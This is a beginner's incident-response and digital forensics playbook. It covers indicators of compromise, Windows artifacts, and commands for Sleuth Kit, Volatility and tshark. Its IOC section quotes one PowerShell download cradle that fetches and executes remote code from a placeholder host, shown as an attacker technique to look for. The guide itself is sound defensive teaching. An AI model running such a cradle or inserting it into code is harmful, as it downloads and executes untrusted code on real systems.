# Incident Analyst Playbook
*Edited December 2019.*

![rick morty image](https://c-o-d-e-b-e-a-r.github.io/beginner_analyst/images/rick-morty.png)

>*"Jesus, Morty. You can't just add a cyber word to any word and hope it means something." - Rick Sanchez*

## What is it?

Starting out can often be the hardest part of anything you want to try. I know when I first started in this field that I had no idea where to even start looking. The advice that I generally got was just start reading and doing CTF's. In the end this did help but it wasn't until I had a mentor help me along the way that I got the hang of doing them. I hope this guide will ease you into the CTF's or provide an idea of how to approach certain problems. 

As a note some of my training revolves around [SANS courses](https://www.sans.org/), which I highly recommend. The courses that are relevent to some of the content in here is FOR 500, FOR 508, and FOR 572. These three courses are advertised in their incident analyst pathway. 

## What's next?

In 2020 I aim to record myself doing a forensic themed CTF where you will be able to see and hear my thought process and put it up on YouTube. 

Of course there is a section of additional content that I would like to add. I'm happy to take suggestions as well. 

## How to use

Everything will be kept on a single page so you'll be able to CTRL+f.

Where it's applicable I will delineate whether I'm using the [***LINUX-SIFT***](https://digital-forensics.sans.org/community/downloads) or the ***WIN-SIFT***. Note that the ***WIN-SIFT*** is only available if you're doing one of the SANS courses that provides it otherwise download a [Windows VM](https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/) and install the tool yourself. 

<a name="b2t"></a>
## Table of contents

- [ Things to do ](#things-to-do) 
- [ Change log ](#change-log)
- [ General IOCs ](#general-iocs)
  - [Misnamed processes](#misnamed-processes)
  - [Remote processes in memory](#remote-processes-in-memory)
  - [PowerShell download cradle](#ps-download-cradle)
  - [Domain controller ntdsutil](#dc-ntdsutil)
  - [Proxy logs](#proxy-logs)
  - [Folder/file creation](#folderfile-creation)
- [General information](#gen-win-info)
  - [Windows event logs](#win-event-logs)
  - [Basics of tracking WMI activity](#track-wmi-activity)
  - [The epoch times](#the-epoch-times)
  - [Windows known folder GUIDs](#win-known-guids)
  - [Windows well known SIDs](#win-known-sids)
  - [HTTP Version History](#http-ver-history)
  - [HTTP response codes](#http-response-codes)
  - [Magic bytes for common files](#magic-bytes-common-files)
  - [Service start type](#service-start-types)
  - [Interesting domain information](#interesting-domain-info)
  - [Browser behaviour](#browser-behaviour)
- [Live capturing tools](#live-cap-tools)
  - [tcpdump](#live-tcpdump)
- [Analysis tips & tools](#analysis-tools)
  - [Mounting shared folders in Linux](#mount-share-folders-linux)
  - [The Sleuth Kit](#sleuth-kit)
  - [Volatility](#volatility)
  - [Kernel OST viewer](#kernel-ost-viewer)
  - [Wireshark](#wireshark)
  - [NetworkMiner](#networkminer)
  - [tshark](#tshark)
  - [Cyber Chef](#cyber-chef)
  - [exiftool](#exiftool)
  - [xclip](#xclip)
  - [Event log explorer](#event-log-explorer)

<a name="things-to-do"></a>
## Things to do
[*back to table of contents*](#b2t)

This is probably never ending but here is a list of things I want to add. Reach out to me if you'd like to help contribute. 
* Event ID table, build more on what's currently there.
* Include SEC504 and FOR500 into the playbook.
* Google analytic cookies, UTM.
* Hubspot targeting cookies, ```__hstc```.
* DNS record types (572-b2p55) grab from my index. 
* acronym list
*	tshark into tools with basic switches.
*	FTP file extraction with wireshark (572b3p74-82)
*	kibana analysis setup

<a name="change-log"></a>
## Change log
[*back to table of contents*](#b2t)

| Date | Subject | Description |
| :-------- | :--------- | :------------ |
| 3 Dec 19 | Start | Beginning of transfer of Word doc onto github. Completed up to SANS FOR508 exercises.|

<a name="general-iocs"></a>
## Genral IOCs
[*back to table of contents*](#b2t)

The purpose of this section is to give you an idea of what to look for that may indicate malicious activity. 

IOC = indicator of compromsie

<a name="misnamed-process"></a>
### Misnamed processes

A quick win for analysts is to identify processes found in the process list that try to appear legitimate but are misnamed.

For example, `SVCHOST` renamed to `SCVHOST`. It also useful to look at the parent process and ensure that it is what it should be. A common process table can be found [here](https://digital-forensics.sans.org/media/SANS_Poster_2018_Hunt_Evil_FINAL.pdf).

<a name="remote-processes-in-memory"></a>
### Remote processes in memory

If you happen to find the process `WMIPrvSE` in a memory image this can indicate a remote connection to the machine. If this is uncommon for the network that you are looking at then this could indicate suspicious/malicious activity. 

<a name="ps-download-cradle"></a>
### PowerShell download cradle 

Many attackers will use the following command to reach out and download other files, commonly seen in webshells.

```IEX(New-Object System.Net.WebClient).downloadstring(‘http://example.com/foo.exe’)```

<a name="dc-ntdsutil"></a>
### Domain controller ntdsutil

Seeing this tool being run on an Active Directory may indicate that a malicious user now has access to all domain password hashes via an exported NTDS.dit file. 

<a name="proxy-logs"></a>
### Proxy Logs

Proxy logs are a great source for information and can uncover information that may no longer, or never did, exist on a victim system. Below are examples but it is easy to adapt this approach. 

#### Google search

Google will record its search history almost like a key logger in proxy logs. Do a grep for 'google.com' and then 'complete'. 

#### Mail

You may also be able to grep out 'example-mail.com' and then look for `sentconfirm`, `SHOW_CONFIRMPAGE`, or logon/logout sessions.

#### Data dumping

It will be useful to stay on top of what are the most common dumping sites/exfiltration methods. This could be cloud storage like OneDrive, SharePoint, Google Drive, or websites like GitHub or PasteBin. PasteBin will send you a short link to what you uploaded and can be used to see what may be exfiltrated.

<a name="folderfile-creation"></a>
### Folder/file creation 

If you can see file creation in areas where you know it needs Administrator permissions (ie. Program Files and the Windows folders), from a user that you know is an attacker then you know that the attacker has gained privileges equivalent to the Administrator. 

<a name="gen-win-info"></a>
## General information

The following section contains general information about Windows, computers, browsers, etc. that an analyst should at least know exists.

<a name="win-event-logs"></a>
### Windows event logs
[*back to table of contents*](#b2t)

The event logs are a rich source of information in an investigation. For Windows Security logs the following reference is really useful in knowing what each code is doing; <https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/Default.aspx>

For a forensic look at codes; <https://www.forwarddefense.com/pdfs/Event_Log_Analyst_Reference.pdf>

#### Specific codes

**5858 - Microsoft-Windows-WMI-Activity**

These log will record WMI activity and will give a results code that potentially can give further information. For result codes go here: <https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-error-constants?redirectedfrom=MSDN>

<a name="track-wmi-activity"></a>
### Basics of tracking WMI activity
[*back to table of contents*](#b2t)

Go to; <https://www.darkoperator.com/blog/2017/10/14/basics-of-tracking-wmi-activity>

<a name="the-epoch-times"></a>
### The epoch times
[*back to table of contents*](#b2t)

Programs and logs will often use various timestamps to record data. While timestamps like Local Times are easy enough to convert to UTC sometimes others are hard to recognise. Below is a table to help assist in identifying those timestamps.

| Name | Description | Example |
| :--- | :---------- | :------ |
| UNIX epoch time (POSIX time) | Seconds since 1970-01-01 00:00:00 UTC | 1570603604 |
| FAT epoch time | Seconds since 1980-01-01 00:00:00 UTC |   |

A list of other systems and when they start the count for their epoch time can be found here: <https://en.wikipedia.org/wiki/Epoch_(computing)>.

For an online converter which also includes function from different programming languages to get the current epoch time, look here: <https://www.epochconverter.com/>.

<a name="win-known-guids"></a>
### Windows known folder GUIDs
[*back to table of contents*](#b2t)

There are some common Windows GUIDs that an analyst should be across. Below is a brief table but more can be found here: <https://docs.microsoft.com/en-us/windows/win32/shell/knownfolderid>.

| Display Name | GUID |
| :----------- | :--- |
| Start Menu | {625B53C3-AB48-4EC1-BA1F-A1EF4146FC19} |
| VSS | {3808876b-xxxx-xxxx-xxxx-xxxxxxxxxxxx} |

For more information on the VSS read; <https://github.com/libyal/libvshadow/blob/master/documentation/Volume%20Shadow%20Snapshot%20(VSS)%20format.asciidoc>

and 

<https://docs.microsoft.com/en-us/windows/win32/vss/shadow-copies-and-shadow-copy-sets>.

<a name="win-known-sids"></a>
### Windows well known SIDs
[*back to table of contents*](#b2t)

This is something analysts will eventually get a feel for but it is generally known that the last part of the SID is the RID which can identify different types of users. For a comprehensive list go to: <https://support.microsoft.com/en-au/help/243330/well-known-security-identifiers-in-windows-operating-systems>.

| SID |	Meaning |
| :--- | :--- |
| S-1-5-21domain-500 |	Administrator |
| S-1-5-21domain-501 |	Guest |
| S-1-5-21domain-1000+ |	Local Users |

To further explain the SID the below table breaks down the components of an example SID. 

| S |	1 |	5 |	21-3623811015-3361044348-30300820 | 1013 |
| :--- | :--- | :--- | :--- | :--- |
| The string is a SID. | The revision level (the version of the SID specification). | The identifier authority value. | Domain or local computer identifier. |	A Relative ID (RID). Any group or user that is not created by default will have a Relative ID of 1000 or greater. |

<a name="http-ver-history"></a>
### HTTP version history
[*back to table of contents*](#b2t)

This information can be gleamed from the request string in most instances. 

| Protocol | Release |	Details |
| :--- | :--- | :--- |
| HTTP/0.9 |	1991 |	Should never be seen |
| HTTP/1.0 |	1996 |	Rare but not unheard of |
| HTTP/1.1 |	1997 |	Most common |
| HTTP/2 |	2015 |	Binary, multiplexed, generally with TLS |

<a name="http-response-codes"></a>
### HTTP response codes
[*back to table of contents*](#b2t)

When a client submits a request to a webserver the server will respond with a three-digit code. Below is a brief list of those codes. 

| Code |	Reason |
| :--- | :--- |
| 100, Continue |	After the server receives the headers for a request, this directs the client to proceed. |
| 200, OK |	Possibly the most common value, indicates the server was able to fulfill the request without incident. |
| 301, Moved permanently |	The server provides a new URL for the requested resource, and the client then ostensibly makes that request. "Permanent" means the original request should be assumed outdated. |
| 302, Found |	In practice, a temporary relocation, although this is not strictly in compliance with the standard. |
| 304, Not modified |	Indicates the requested resource has not changed since it was last requested.|
| 400, Bad syntax |	The request was somehow syntactically incorrect. |
| 401, Unauthorized |	Client must authenticate before the response can be given. |
| 403, Forbidden |	Request was valid, but client is not permitted access (regardless of authentication). |
| 404, Not found |	Requested resource does not exist. |
| 407, Proxy authentication required |	Like 401, but for the proxy server. |
| 500, Internal server error |	Generic server error message. |
| 503, Service unavailable |	Server is overloaded or undergoing maintenance. |
| 511, Network authentication required |	Client must authenticate to gain access-used by captive proxies such as at Wi-Fi hotspots. |

<a name="win-time-rules"></a>
### Windows time rules
[*back to table of contents*](#b2t)

This is a pdf taken from the SANS website that provides a quick explaination of time rules with different file operations. Check out the top right table on the following poster: <https://www.sans.org/security-resources/posters/windows-forensic-analysis/170/download>.

<a name="magic-bytes-common-files"></a>
### Magic bytes for common files
[*back to table of contents*](#b2t)

While these are the common magic bytes that you’ll come across a comprehensive list can be found at: <https://en.wikipedia.org/wiki/List_of_file_signatures>.

| Type |	Mnemonic |	Byte Signature (0x) |
| :--- | :--- | :--- |
|DOS exe|	MZ	|4D 5A|
|PE32 exe|	MZ….PE..	|4D 5A … 50 45 00 00|
|ELF exe|	.ELF	|7F 45 4C 46|
|Zip archive (also word docs)|	PK..	|50 4B 03 04|
|Rar archive|	Rar!....	|52 61 72 21 1A 07 01 00|
|7z archive|	7z¼¯'	|37 7A BC AF 27 1C|
|Gzip archive|	..	|1F 8B|
|PNG image|	.PNG….	|89 50 4E 47 0D 0A 1A 0A|
|BMP image|	BM	|47 49 46 38 37 61|
|GIF image|	GIF87a	|47 49 46 38 37 61|
|	|GIF89a	|47 49 46 38 39 61|
|pcap file|	¡²ÃÔ	|A1 B2 C3 D4|
|	|ÔÃ²¡	|D4 C3 B2 A1|
|pcapng file|	….	|0A 0B 0C 0D|
|PDF document|	%PDF-	|25 50 44 46 2D|

<a name="service-start-types"></a>
### Servcie start types
[*back to table of contents*](#b2t)

|Value|	Start Type|	Meaning|
| :--- | :--- | :--- |
|0x00|	Boot|	The kernel loaded will load this driver first as its needed to use the boot volume device.|
|0x01|	System|	This is loaded by the I/O subsystem.|
|0x02|	Autoload|	The service is always loaded and run.|
|0x03|	Manual|	This service does not start automatically and must be manually started by the user. |
|0x04|	Disabled|	The service is disabled and should not be started. |

<a name="interesting-domain-info"></a>
### Interesting domain information
[*back to table of contents*](#b2t)

**Domain users**

It is possible to query the following registry key on the domain controller,

```SOFTWARE\Microsoft\Windows NT\CurrentVersion\Profile List```

This can be used to compare an SID and get the username of the domain user.

<a name="browser-behaviour"></a>
### Browser behaviour
[*back to table of contents*](#b2t)

#### Google Chrome

**Search strings**

These can be found in proxy logs or even in memory. Below is an example of how we can see what the logged on user was searching for. It’s almost like Chrome is a keylogger. 
When the user is typing into the browser address bar we will see request strings like (the user would not see these strings):

```/s?hl=en&sugexp=tsh&gs_nf=l&gs_mss=online%20drop%20si&cp=16&gs_id=lv&xhr=t&q=online%20drop%20site&pf=p&output=search&sclient=psyab&oq=&aq=&aqi=&aql=&gs_l=&pbx=l&bav=on.2, or.r_gc.r_pw.r_qf.,cf.osb&fp=68c4c5cdla158f5c&biw=1128&bih=580&tch=l&ech=16&psi=3EjZT8mwL8Pt6gGnr728Aw.1339640029993.1```

When the user types into the search box on google.com then the request strings look like,
```/complete/search?sugexp=chrome,mod=9&client=chrome&hl=enUS&q=deaddrop.com```

When the user hits ENTER after entering the search in the address bar or the search box the following HTTP request would display in the user’s address bar,
`/search?sugexp=chrome,mod=9&sourceid=chrome&ie=UTF-8&q=dead+drop+for+data`

<a name="live-cap-tools"></a>
## Live capturing tools

<a name="live-tcpdump"></a>
### tcpdump
[*back to table of contents*](#b2t)

#### Capturing FTP

To capture active-mode FTP traffic use the following, 

```sudo tcpdump -i ens33 -w ftp_active_full.pcap '(tcp and (port 21 or port 20))’```

To capture active and passive FTP traffic use, 

```sudo tcpdump - i ens33 -w ftp_full.pcap '(tcp and (port 21 or ((src portrange 1024-65535 or src port 20) and (dst portrange 1024- 65535 or dst port 20)))'```

<a name="analysis-tools"></a>
## Analysis tips & tools

<a name="mount-share-folders-linux"></a>
### Mounting shared folders in Linux
[*back to table of contents*](#b2t)

Mounting a shared folder from a Windows host to a Linux VM in Workstation Pro. 
Open VM settings, click options, enable Shared Folders and add the host folder path.

![sharedfolder image](https://c-o-d-e-b-e-a-r.github.io/beginner_analyst/images/sharedfolder.png)

On the Linux VM do the following `sudo vmware-hgfsclient`

Note the output (it should reflect the name you set when editing VM settings. For this example the output was `Challenge`

Make a directory where you want to mount the shared folder.

`sudo mkdir /mnt/hgfs/Challenge`

Connect the shared folder to the directory you created.

`sudo vmhgfs-fuse .host:/Challenge /mnt/hgfs/Challenge -o allow_other -o uid=1000`

Files should now appear on your mounted directory. If you want to automount edit `/etc/fstab`.

`.host:/{shared-folder}/{path-to-mount-on} vmhgfs defaults,ttl=5,uid=1000,gid=1000 0 0`

<a name="sleuth-kit"></a>
### The Sleuth Kit 
[*back to table of contents*](#b2t)

***LINUX-SIFT***

The Sleuth Kit (TSK) is a cmdline tool that is useful for quick incident response. The tool is designed to be used on a disk image. 

For the purpose of this section assume the disk image we're using is `DomainController.raw`.

**Get offsets**: `mmls`, will output the offsets needed for further commands. 

![mmls image](https://c-o-d-e-b-e-a-r.github.io/beginner_analyst/images/mmls.png)

In the image above we can see the start of the partitions for the drives. The first NTFS partition is the reserved portion so what we're interested in is the second value, `718848`.

This is the number that we will use with the `-o` switch. 

**Check filesystem inodes**: I won't explain what inodes are here but we can use the numbers and the following commands to traverse the disk image within the cmdline. 

The following image shows the top level file structure of the disk image we're looking at; `fls -o 718848 DomainController.raw`.

![foldertraversal image](https://c-o-d-e-b-e-a-r.github.io/beginner_analyst/images/foldertraversal.png)

Then lets say you want to go into and look at the users directory we can use its inode to look at it; `fls -o 718848 DomainController.raw 406`

![foldertraversal image](https://c-o-d-e-b-e-a-r.github.io/beginner_analyst/images/userfolder.png)

**Output MFT timeline**: The master file table (MFT) contains a lot of good information about file creation and changes on the disk. It will also contain both the $STANDARD_INFORMATION and $FILENAME timestamps for the file.

Run the following (the MFT inode is always 0);

`icat -o 718848 DomainController.raw 0 > mft.raw`

`icat` can be used just like `cat` on the linux cmdline and used similar to above to output any file you can find. 

`analyzeMFT.py -f mft.raw -e -o mft.csv`

The `-e` switch in the above command outputs the times in a UTC format rather than epoch time. 

**Output a file list**: This may be useful to just see obviously suspicious files especially if the names stick out or you know the filesystem you're working with. 

`fls -o 718848 DomainController.raw -r -p > c_filelist.txt`

**Output file timeline**: This timeline will only contain the mactimes and would be hard to see time-stompping. If that is a concern then you can always look into the `mft.csv`.

`fls -o 718848 DomainController.raw -r -p -m C:/ > bodyfile.body`

Then run;

`mactime -z -b bodyfile.body -d -y [2019-01-01] > fls_timeline.csv`

In the above command if `[2019-01-01]` is left out then it will give the entire timeline or if you're only interested in a period then you can look at a range `[2019-01-01..2019-01-24]`.

**Recover directories**: You may want to recover a directory, particularly the `$OrphanFiles` which may contain files deleted by the attacker. 

`mkdir recovered_recyclebin`

`tsk_recover -o 718848 DomainController.raw -e -d 84736 recovered_recyclebin/`

<a name="volatility"></a>
### Volatility 
[*back to table of contents*](#b2t)

***LINUX-SIFT***

**Volatility References**: The volatility github page provides a list of the basic commands and examples of how they are used. <https://github.com/volatilityfoundation/volatility/wiki/Command-Reference>

Investigating Windows threads with volatility. <http://mnin.blogspot.com/2011/04/investigating-windows-threads-with.html>

**Github plugins**: Third party plugins can be used with volatility and will be very useful in assessing some malware that is on the system.

Make sure if you are using the `-–plugin` switch, that it appears first in the command line for it to successfully run ie, 

`volatility --plugin=<path_to_dir> -f <image> --profile=<profile> [command]`

`USBSTOR`: Scans registries for values relating to USB devices plugged into the system. <https://github.com/kevthehermit/volatility_plugins/tree/master/usbstor>

`cobaltstrikescan.py`: Used for detecting Cobalt Strike using volatility. <https://github.com/JPCERTCC/aa-tools/blob/master/cobaltstrikescan.py>

**Getting profile information**: When you first have a memory image the profile of the image will need to be extracted to use with the other commands that will be run, this can be done using the following on the Linux SIFT,

`vol.py -f image.raw imageinfo > imageinfo.txt`

This can be used in conjunction with the following to get a better idea of the profile,

`vol.py -f image.raw kdbgscan > kdbgscan.txt`

**Rogue processes**: A good place to start is, 

`vol.py -f image.raw --profile=<profile> psscan > psscan.txt`

`vol.py -f image.raw --profile=<profile> pstree > pstree.txt`

This can then be further dug into using pslist with the `-p` option for a process ID. 

**Command line arguments for processes**: We can get a list of DLLs attached to the processes and the command line invocation used with, 

`vol.py -f image.raw --profile=<profile> dlllist`

We can also use the optional `-p` option to look at a single process.

**User that ran a process**: It may be useful to know which user started a process particularly if we have already identified a rouge user account.

`vol.py -f image.raw --profile=<profile> getsids -p <PID>`

We can then grep the whole output of getsids to see what else the user was running.

`vol.py -f image.raw --profile=<profile> getsids |grep -i <username>`

**Looking at handles**: The volatility handles plugin can be used to help further identify further IOCs or can be used to so network indicators that may be in processes that should be. 

The following command shows how to get the handles in a good format for a single process, 

`vol.py -f image.raw --profile=<profile> handles -s -t File,Key -p <PID>`

**Network artifacts**: We can review the network connections with the following command,

`vol.py -f image.raw --profile=<profile> netscan > netscan.txt`

This can further be filtered by adding using, `egrep -i ‘CLOSE|ESTABLISHED|Offset`.

**Counting services**:

`vol.py -f image.raw --profile=<profile> svcscan -v |grep “Service Name” |wc -l`

This will count the amount of services on the memory image. 

**Finding code injection**: The following command will find suspicious processes in memory which can be used for further the research,

`vol.py -f image.raw --profile=<profile> malfind > malfind.txt`

We can then use procdump with volatility and then use the following command to look at the readable strings.

`strings -a -t d -e l process.<random_string>.<hex_string>.dmp >> <process_name>.uni`

This may reveal strings that we can Google which could reveal malicious code or titles. 

**Investigating a process further**

First lets dump a process. 

`vol.py -f image.raw --profile=<profile> procdump -p <PID> --dump-dir=./`

Have a quick review of the executable,

`strings -a -t d executable.<PID>.exe`

Then lets use pescan to give us an analysis of the executable. 

`pescan -anomalies executable.<PID>.exe`

Then let’s check the memory dump for the same process. 

`vol.py -f image.raw --profile=<profile> memdump -p <PID> --dump-dir=./`

Then use strings again,

`strings -a -t d -e l <PID>.dmp > strings<PID>.uni`

We can then grep for IOCs that we found elsewhere or we can look for shares.

`grep -i ‘\\c\$’ strings<PID>.uni`

**Check for files in memory**

We can use the following command to check for documents that may be opened in memory. 

`vol.py -f image.raw --profile=<profile> filescan > filescan.txt`

If we are interested in Word documents in memory then we can use the following. 

`grep -i docx filescan.txt`

**Extract a driver from a memory image**

First lets identify the base offset of the driver that we want to extract. 

`vol.py -f image.raw --profile=<profile> modules`

Then we can use the base value to dump the driver. 

`vol.py -f image.raw --profile=<profile> moddump -b <base_offset> --dump-dir=./`

<a name="kernel-ost-viewer"></a>
### Kernel OST viewer 
[*back to table of contents*](#b2t)

***WIN-SIFT***

This tool is useful to review a users outlook files.

1.	Mount the imaged drive through Arsenal Image Mounter.
2.	Launch Kernel OST Viewer.
3.	Navigate to; `<mounted drive letter>:/Users/<user>/AppData/Local/Microsoft/Outlook/<ost file>`

<a name="wireshark"></a>
### Wireshark
[*back to table of contents*](#b2t)

***either-SIFT***

Wireshark can be used to filter through packets and the display filters will be useful to find things that are suspicious.

**POST requests**: From a client machine or even a server POST requests are usually suspicious and in general may be rare within the environment. This can be looked at using the display filter;

`http.request.method == “POST”`

**HTTP host**: If the site that is being posted to this can be added onto the display filter with and or just search for by itself;

`http.host contains “example.com”`

<a name="networkminer"></a>
### NetworkMiner 
[*back to table of contents*](#b2t)

***LINUX-SIFT***

This can be used for some quick wins. You’ll only be able to use pcap with the free version so if you have a pcapng image then use [convert pcapng to pcap](#tshark).

To install this on the ***LINUX-SIFT*** machine I followed the following link <https://www.netresec.com/?page=Blog&month=2014-02&post=HowTo-install-NetworkMiner-in-Ubuntu-Fedora-and-Arch-Linux>.

First follow Step 1 for Ubuntu and then check the version of Mono. If need by go to the link it gives and just install the new Mono which will update what you have. 

Then follow step 2 but use the link in the green box with the `wget` instead. This is because we want version 2.4.

Finally create a line in the users `.bashrc`;

`alias NetworkMiner='mono /opt/NetworkMiner_2-4/NetworkMiner.exe'`

This is so in a terminal you can simply type `NetworkMiner` to launch the program.

<a name="tshark"></a>
### tshark 
[*back to table of contents*](#b2t)

***LINUX-SIFT***

This is the command line based tool of Wireshark.

**Convert pcapng to pcap**: The following command will convert the pcapng to pcap;

`tshark -F pcap -r <input pcapng file> -w <output pcap file>`

**Display filters**: The display filters that you would use for Wireshark can be used exactly as is in tshark.

`tshark -n -r example.pcap -Y ‘http.host contains “examplesite.com”’`

**Extract files**: From the above we may find a packet and then extract something from that stream, first let’s assume the frame number is `29099`. Get the stream number out;

`tshark -n -r example.pcap -Y ‘frame.number==29099’ -T fields -e tcp.stream`

Then using the stream number (assume `465`) extract the data out and save the file;

`tshark -n -r example.pcap -Y ‘tcp.stream==465’ -T fields -e tcp.segment_data > data_extract.txt`

Remove all the newlines and colon separator characters;

`cat data_extract. txt | awk '{printf “%s”, $1}' | tr -d ':' > base64_hex.txt`

Convert this into ASCII equivalent;

`cat base64_hex.txt | perl -nE ‘print pack(“H*”, $_);’ > http_post.txt`

Then remove all the none base64 encoded data and use cyber chef to decode it. 

<a name="cyber-chef"></a>
### Cyber Chef 
[*back to table of contents*](#b2t)

This is an excellent online resource and can be used for analysis in the following ways.

**Decode base64**: Malicious attackers will often encode their payloads in base64 for obfuscation. When an analyst comes across this then the following link will be useful to put it into human readable format, <https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)Remove_null_bytes()>

The recipe is first decoding it and then removing the null bytes, making it easier to add into your notes or even insert into a script to test. 

<a name="exiftool"></a>
### exiftool 
[*back to table of contents*](#b2t)

***LINUX-SIFT***

This is a Linux based tool that can read and write meta information in files. Used by,

`exiftool <file>`

<a name="xclip"></a>
### xclip 
[*back to table of contents*](#b2t)

***LINUX-SIFT***

Very handy tool to get text data onto your clipboard from Linux. I usually will use this with the `cat` command and will work when remoting to another system and you have an interactive shell. This is not a native tool. 

`cat <file> |xclip -sel c`

<a name="event-log-explorer"></a>
### Event log explorer 
[*back to table of contents*](#b2t)

***WIN-SIFT***

Windows event logs on modern systems can be found in `\Windows\system32\winevt\logs\`. This first example relates to the Security log. 

Open ‘Event Log Explorer’ and then `File > Open Log File > New API`.

Event logs are usually located in `C:\Winodws\system32\winevt\logs`.

If the program cannot open a log try again but with the ‘Direct’ option which is more tolerant of log file corruption.

Whenever opening a new log go through this process:

`View > Time Correction > Select “Display UTC Time”`

On the Windows SIFT we have the ability to add colour coding to the Viewer.

`View > Color Coding > Load… > add “G:\Event-Log-Explorer-Templates\ELEX-Security-Log-Color-Coding.ecc” > Close`

We can also use the SANS custom columns.

`View > Custom Columns > Load > Load all columns > add “G:\Event-Log-Explorer-Templates\ELEX-Security-Log-508-Custom-Columns_English.ccols” > Open > OK`

For the System log complete the steps above but swap out the Security log for the System log and also use the `G:\Event-Log-Explorer-Templates\ELEX-System-Log-Custom-Columns_Any-Language.ccols` file.

Other interesting log locations that are covered in the SANS FOR508 exercises 2.x are:

`TaskScheduler%4Operational.evtx`

`Microsoft-Windows-WMI-Activity%40Operational.evtx`

`Microsoft-Windows-PowerShell-Activity%40Operational.evtx`
